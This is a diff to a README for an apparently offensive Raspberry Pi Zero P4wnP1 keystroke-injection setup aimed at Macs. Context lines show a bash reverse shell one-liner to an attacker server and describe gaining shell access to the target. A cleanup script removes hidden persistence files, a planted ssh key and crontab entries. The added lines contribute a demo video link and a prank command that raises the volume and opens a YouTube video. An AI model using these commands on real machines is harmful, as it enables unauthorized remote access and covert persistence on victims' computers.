@@ -2,6 +2,10 @@
 
 There are some threads about P4wnP1 ducky not running on Mac but here is an introduction about setting up P4wnP1 so your pi zero can attack Mac.
 
+## Demo Video
+
+[![Brian Ducky Raspberry Pi Zero demo](https://img.youtube.com/vi/vyz5C6BCJAE/0.jpg)](https://www.youtube.com/watch?v=vyz5C6BCJAE)
+
 ## Requirements
 
 1. Raspberry Pi Zero
@@ -63,8 +67,14 @@ bash -i >& /dev/tcp/YOUR_SERVER_IP/8080 0>&1
 3. On your server, when you see a connection being created, you then have bash access to the target machine. You would be able to see the output of bash directly on your machine with the setup above.
 4. In [payloads/](./payloads/) there is a reverse shell ducky script example. Here is the clean up script if you use my example.
 ```shell
-rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/ras_pub_; rm ~/Library/.hidden/app_support.sh; rm ~/Library/Python3.65; rm /usr/local/bin/Python3.65;
+rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/rsa_pub_; rm ~/Library/.hidden/app_support.sh; rm ~/Library/Python3.65; rm /usr/local/bin/Python3.65;
 echo "" | crontab - && crontab -r
+```
+
+## What Now
+
+```shell
+osascript -e 'set volume 7' && open https://www.youtube.com/watch?v=dQw4w9WgXcQ&frags=pl%2Cwn
 ```
 
 ## Author and Contributors
